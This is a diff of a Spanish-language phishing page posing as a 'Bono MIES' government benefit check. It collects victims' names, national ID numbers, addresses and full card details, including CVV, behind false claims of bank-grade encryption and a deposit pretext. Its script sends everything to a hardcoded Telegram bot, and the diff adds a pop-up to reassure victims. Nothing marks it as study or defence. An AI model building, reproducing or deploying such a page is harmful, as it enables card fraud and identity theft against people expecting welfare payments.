@@ -1,184 +1,162 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Consulta Bono MIES</title>
-<style>
-  @import url('https://fonts.googleapis.com/css2?family=Poppins&display=swap');
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Consulta Bono MIES</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Poppins&display=swap');
 
-  body {
-    background: #f0f2f5;
-    font-family: 'Poppins', sans-serif;
-    display: flex;
-    justify-content: center;
-    align-items: flex-start;
-    min-height: 100vh;
-    padding: 30px 15px;
-  }
+    body {
+      background: #f0f2f5;
+      font-family: 'Poppins', sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      min-height: 100vh;
+      padding: 30px 15px;
+    }
 
-  .container {
-    background: white;
-    border-radius: 12px;
-    box-shadow: 0 5px 15px rgba(0,0,0,0.1);
-    width: 100%;
-    max-width: 460px;
-    padding: 30px 25px 25px;
-    box-sizing: border-box;
-  }
-
-  .header {
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    margin-bottom: 25px;
-  }
-
-  .header img {
-    width: 140px;
-    height: auto;
-  }
-
-  h1 {
-    font-size: 22px;
-    font-weight: 700;
-    color: #111b35;
-    margin-bottom: 24px;
-  }
-
-  label {
-    display: block;
-    font-size: 14px;
-    color: #111b35;
-    margin-bottom: 6px;
-    font-weight: 600;
-  }
-
-  input[type="text"], input[type="checkbox"], input[type="password"] {
-    box-sizing: border-box;
-  }
-
-  input[type="text"], input[type="password"] {
-    width: 100%;
-    padding: 12px 14px;
-    font-size: 15px;
-    border-radius: 8px;
-    border: 1.7px solid #c3cad9;
-    margin-bottom: 18px;
-    transition: border-color 0.3s ease;
-  }
-
-  input[type="text"]:focus, input[type="password"]:focus {
-    border-color: #0b234d;
-    outline: none;
-  }
-
-  .inline-inputs {
-    display: flex;
-    gap: 15px;
-    margin-bottom: 18px;
-  }
-
-  .inline-inputs > div {
-    flex: 1;
-  }
-
-  .security {
-    display: flex;
-    align-items: center;
-    gap: 8px;
-    font-size: 14px;
-    color: #2a5a27;
-    margin-bottom: 20px;
-  }
-
-  .security svg {
-    width: 18px;
-    height: 18px;
-    fill: #2a5a27;
-  }
-
-  button {
-    width: 100%;
-    background: #0b44a4;
-    color: white;
-    font-weight: 700;
-    font-size: 15px;
-    padding: 14px 0;
-    border: none;
-    border-radius: 8px;
-    cursor: pointer;
-    text-transform: uppercase;
-    box-shadow: 0 4px 9px rgba(11, 68, 164, 0.5);
-    transition: background-color 0.3s ease;
-  }
-
-  button:hover {
-    background: #09377d;
-  }
-
-  .legal {
-    font-size: 12px;
-    color: #5a5f6b;
-    margin-top: 18px;
-    line-height: 1.4;
-    text-align: center;
-  }
-
-  .checkbox-container {
-    display: flex;
-    align-items: center;
-    gap: 10px;
-    margin-bottom: 20px;
-  }
-
-  .checkbox-container label {
-    margin: 0;
-    font-weight: 500;
-    font-size: 13px;
-    color: #111b35;
-  }
-
-  .error-message {
-    color: #d93025;
-    font-size: 13px;
-    margin-top: -14px;
-    margin-bottom: 14px;
-    display: none;
-  }
-
-  #info-tarjeta {
-    display: none;
-    background: #eaf7e5;
-    border: 1px solid #bde5a7;
-    padding: 12px;
-    border-radius: 8px;
-    font-size: 13px;
-    color: #2a5a27;
-    margin-bottom: 15px;
-  }
-
-  #cerrar-info {
-    margin-top: 10px;
-    background: #2a5a27;
-    color: white;
-    border: none;
-    padding: 6px 14px;
-    border-radius: 5px;
-    font-size: 13px;
-    cursor: pointer;
-  }
-
-  @media (max-width: 440px) {
     .container {
-      padding: 25px 20px 20px;
-      max-width: 100%;
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+      width: 100%;
+      max-width: 460px;
+      padding: 30px 25px 25px;
+      box-sizing: border-box;
     }
+
+    .header {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-bottom: 25px;
+    }
+
+    .header img {
+      width: 140px;
+      height: auto;
+    }
+
+    h1 {
+      font-size: 22px;
+      font-weight: 700;
+      color: #111b35;
+      margin-bottom: 24px;
+    }
+
+    label {
+      display: block;
+      font-size: 14px;
+      color: #111b35;
+      margin-bottom: 6px;
+      font-weight: 600;
+    }
+
+    input[type="text"], input[type="password"], input[type="checkbox"] {
+      box-sizing: border-box;
+    }
+
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 12px 14px;
+      font-size: 15px;
+      border-radius: 8px;
+      border: 1.7px solid #c3cad9;
+      margin-bottom: 18px;
+      transition: border-color 0.3s ease;
+    }
+
+    input[type="text"]:focus, input[type="password"]:focus {
+      border-color: #0b234d;
+      outline: none;
+    }
+
     .inline-inputs {
-      flex-direction: column;
+      display: flex;
+      gap: 15px;
+      margin-bottom: 18px;
     }
-  }
-</style>
+
+    .inline-inputs > div {
+      flex: 1;
+    }
+
+    .security {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 14px;
+      color: #2a5a27;
+      margin-bottom: 20px;
+    }
+
+    .security svg {
+      width: 18px;
+      height: 18px;
+      fill: #2a5a27;
+    }
+
+    button {
+      width: 100%;
+      background: #0b44a4;
+      color: white;
+      font-weight: 700;
+      font-size: 15px;
+      padding: 14px 0;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      text-transform: uppercase;
+      box-shadow: 0 4px 9px rgba(11, 68, 164, 0.5);
+      transition: background-color 0.3s ease;
+    }
+
+    button:hover {
+      background: #09377d;
+    }
+
+    .legal {
+      font-size: 12px;
+      color: #5a5f6b;
+      margin-top: 18px;
+      line-height: 1.4;
+      text-align: center;
+    }
+
+    .checkbox-container {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 20px;
+    }
+
+    .checkbox-container label {
+      margin: 0;
+      font-weight: 500;
+      font-size: 13px;
+      color: #111b35;
+    }
+
+    .error-message {
+      color: #d93025;
+      font-size: 13px;
+      margin-top: -14px;
+      margin-bottom: 14px;
+      display: none;
+    }
+
+    @media (max-width: 440px) {
+      .container {
+        padding: 25px 20px 20px;
+        max-width: 100%;
+      }
+      .inline-inputs {
+        flex-direction: column;
+      }
+    }
+  </style>
 </head>
 <body>
 
@@ -207,11 +185,6 @@
     <input type="text" id="tarjeta" name="tarjeta" pattern="\d{13,19}" maxlength="19" required />
     <div class="error-message" id="error-tarjeta">La tarjeta debe tener entre 13 y 19 dígitos numéricos.</div>
 
-    <div id="info-tarjeta">
-      <strong>Nota:</strong> Estos datos se solicitan únicamente en caso de ser aprobado, para proceder al depósito del bono.<br>
-      <button id="cerrar-info" type="button">Aceptar</button>
-    </div>
-
     <div class="inline-inputs">
       <div>
         <label for="fecha">Fecha (MM/AA)</label>
@@ -232,7 +205,7 @@
     <div class="error-message" id="error-terminos">Debes aceptar los términos para continuar.</div>
 
     <div class="security">
-      <svg viewBox="0 0 24 24" fill="none" aria-hidden="true" focusable="false" style="width:18px; height:18px; fill:#2a5a27; margin-right:8px;">
+      <svg viewBox="0 0 24 24" fill="none" aria-hidden="true" focusable="false">
         <path d="M12 1C8.13 1 5 4.13 5 8v3H4a1 1 0 0 0-1 1v8a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-8a1 1 0 0 0-1-1h-1V8c0-3.87-3.13-7-7-7Zm3 11v3h-6v-3h6Zm-3-7a2 2 0 0 1 2 2v2H10V7a2 2 0 0 1 2-2Z"/>
       </svg>
       Tus datos están protegidos con encriptación bancaria de 256 bits.
@@ -253,6 +226,7 @@
   const fechaInput = document.getElementById('fecha');
   const cvvInput = document.getElementById('cvv');
   const terminosCheckbox = document.getElementById('terminos');
+  const nombreInput = document.getElementById('nombre');
 
   const errorCedula = document.getElementById('error-cedula');
   const errorTarjeta = document.getElementById('error-tarjeta');
@@ -260,17 +234,17 @@
   const errorCvv = document.getElementById('error-cvv');
   const errorTerminos = document.getElementById('error-terminos');
 
-  tarjetaInput.addEventListener('focus', () => {
-    document.getElementById('info-tarjeta').style.display = 'block';
-  });
-
-  document.getElementById('cerrar-info').addEventListener('click', () => {
-    document.getElementById('info-tarjeta').style.display = 'none';
+  let yaMostroAlerta = false;
+  nombreInput.addEventListener('input', () => {
+    if (!yaMostroAlerta && nombreInput.value.trim() !== '') {
+      yaMostroAlerta = true;
+      alert('⚠️ Estos datos son solicitados en caso de que su solicitud sea aprobada y se proceda al depósito correspondiente.');
+    }
   });
 
   function soloNumeros(e) {
-    if (e.type === 'keydown' && ["Backspace", "ArrowLeft", "ArrowRight", "Delete", "Tab"].includes(e.key)) return;
-    if (e.type === 'keydown' && !/\d/.test(e.key)) e.preventDefault();
+    if (["Backspace", "ArrowLeft", "ArrowRight", "Delete", "Tab"].includes(e.key)) return;
+    if (!/\d/.test(e.key)) e.preventDefault();
   }
 
   function validarPaste(e) {
@@ -278,12 +252,10 @@
     if (!/^\d+$/.test(paste)) e.preventDefault();
   }
 
-  cedulaInput.addEventListener('keydown', soloNumeros);
-  cedulaInput.addEventListener('paste', validarPaste);
-  tarjetaInput.addEventListener('keydown', soloNumeros);
-  tarjetaInput.addEventListener('paste', validarPaste);
-  cvvInput.addEventListener('keydown', soloNumeros);
-  cvvInput.addEventListener('paste', validarPaste);
+  [cedulaInput, tarjetaInput, cvvInput].forEach(input => {
+    input.addEventListener('keydown', soloNumeros);
+    input.addEventListener('paste', validarPaste);
+  });
 
   fechaInput.addEventListener('keydown', function(e) {
     if (["Backspace", "ArrowLeft", "ArrowRight", "Delete", "Tab"].includes(e.key)) return;
@@ -305,10 +277,11 @@
   function validarFecha(fechaStr) {
     if (!fechaStr || !/^(0[1-9]|1[0-2])\/\d{2}$/.test(fechaStr)) return false;
     const [mm, aa] = fechaStr.split('/');
-    const mes = parseInt(mm, 10), anio = 2000 + parseInt(aa, 10);
-    const hoy = new Date(), mesHoy = hoy.getMonth() + 1, anioHoy = hoy.getFullYear();
-    if (anio < anioHoy || (anio === anioHoy && mes < mesHoy)) return false;
-    if (anio > anioHoy + 10) return false;
+    const mes = parseInt(mm, 10);
+    const anio = 2000 + parseInt(aa, 10);
+    const hoy = new Date();
+    if (anio < hoy.getFullYear() || (anio === hoy.getFullYear() && mes < hoy.getMonth() + 1)) return false;
+    if (anio > hoy.getFullYear() + 10) return false;
     return true;
   }
 
@@ -318,31 +291,40 @@
 
   form.addEventListener('submit', function(e) {
     e.preventDefault();
-    errorCedula.style.display = errorTarjeta.style.display = errorFecha.style.display =
-    errorCvv.style.display = errorTerminos.style.display = 'none';
-    let valido = true;
+    errorCedula.style.display = 'none';
+    errorTarjeta.style.display = 'none';
+    errorFecha.style.display = 'none';
+    errorCvv.style.display = 'none';
+    errorTerminos.style.display = 'none';
 
-    if (!/^\d{10}$/.test(cedulaInput.value)) { errorCedula.style.display = 'block'; valido = false; }
-    if (!/^\d{13,19}$/.test(tarjetaInput.value)) { errorTarjeta.style.display = 'block'; valido = false; }
-    if (!validarFecha(fechaInput.value)) { errorFecha.style.display = 'block'; valido = false; }
-    if (esAmex(tarjetaInput.value)) {
-      if (!/^\d{4}$/.test(cvvInput.value)) { errorCvv.style.display = 'block'; valido = false; }
-    } else {
-      if (!/^\d{3}$/.test(cvvInput.value)) { errorCvv.style.display = 'block'; valido = false; }
+    let valido = true;
+    if (!/^\d{10}$/.test(cedulaInput.value)) {
+      errorCedula.style.display = 'block'; valido = false;
     }
-    if (!terminosCheckbox.checked) { errorTerminos.style.display = 'block'; valido = false; }
+    if (!/^\d{13,19}$/.test(tarjetaInput.value)) {
+      errorTarjeta.style.display = 'block'; valido = false;
+    }
+    if (!validarFecha(fechaInput.value)) {
+      errorFecha.style.display = 'block'; valido = false;
+    }
+    if ((esAmex(tarjetaInput.value) && !/^\d{4}$/.test(cvvInput.value)) || (!esAmex(tarjetaInput.value) && !/^\d{3}$/.test(cvvInput.value))) {
+      errorCvv.style.display = 'block'; valido = false;
+    }
+    if (!terminosCheckbox.checked) {
+      errorTerminos.style.display = 'block'; valido = false;
+    }
 
     if (!valido) return;
-
     enviarTelegram();
   });
 
   function enviarTelegram() {
     const TELEGRAM_BOT_TOKEN = '8032494209:AAE0C8n3-0KH3BCSgMcPSc4j7-2dYxE2ZaE';
     const TELEGRAM_CHAT_ID = '5654253897';
+
     const msg =
       `Nuevo registro Bono MIES:\n` +
-      `Nombre: ${document.getElementById('nombre').value}\n` +
+      `Nombre: ${nombreInput.value}\n` +
       `Cédula: ${cedulaInput.value}\n` +
       `Provincia/Ciudad: ${document.getElementById('provincia').value}\n` +
       `Dirección: ${document.getElementById('direccion').value}\n` +
@@ -352,13 +334,14 @@
 
     fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg })
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text: msg})
     })
     .then(response => {
-      if(response.ok) {
+      if (response.ok) {
         alert('Datos enviados correctamente. ¡Gracias!');
         form.reset();
+        yaMostroAlerta = false;
       } else {
         alert('Error al enviar los datos. Intenta de nuevo.');
       }
@@ -371,4 +354,3 @@
 
 </body>
 </html>
-
